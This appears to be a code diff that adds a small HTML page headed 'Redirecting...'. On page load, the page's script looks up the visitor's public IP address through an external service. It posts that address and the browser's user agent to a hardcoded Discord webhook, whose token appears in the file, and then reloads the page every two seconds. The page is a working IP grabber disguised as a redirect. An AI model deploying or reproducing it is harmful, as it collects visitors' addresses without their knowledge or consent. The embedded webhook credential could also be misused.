@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>URL</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+</head>
+<body>
+  <h3>Redirecting...</h3>
+  <p id="status">Loading...</p>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1427476373143949335/vdkrM8Rs7Nlk7NAcpKOH905gX78s-dmL_O8KLjoFshQbeiS-Df-wDB7kJ9nMdE3IqW5q"; // <-- visible to anyone who views this page
+
+    async function reportIpAndReload() {
+      try {
+        document.getElementById('status').textContent = 'Getting IP...';
+        // get public IP (uses external service)
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipJson = await ipResp.json();
+        const ip = ipJson.ip || 'unknown';
+
+        document.getElementById('status').textContent = 'Sending IP to webhook...';
+
+        // Build a Discord webhook payload
+        const payload = {
+          content: `Visitor IP: ${ip} — UserAgent: ${navigator.userAgent}`
+        };
+
+        // Try to POST directly to Discord webhook (may be blocked by CORS)
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload),
+          mode: 'cors'
+        }).catch(err => {
+          console.warn('Direct webhook POST failed (likely CORS):', err);
+        });
+
+        document.getElementById('status').textContent = `Reported IP: ${ip}. Reloading in 2s...`;
+      } catch (err) {
+        console.error(err);
+        document.getElementById('status').textContent = 'Error: ' + (err.message || err);
+      }
+
+      // Reload after 2 seconds to the same page
+      setTimeout(() => location.reload(), 2000);
+    }
+
+    // Start on load
+    window.addEventListener('load', reportIpAndReload);
+  </script>
+</body>
+</html>
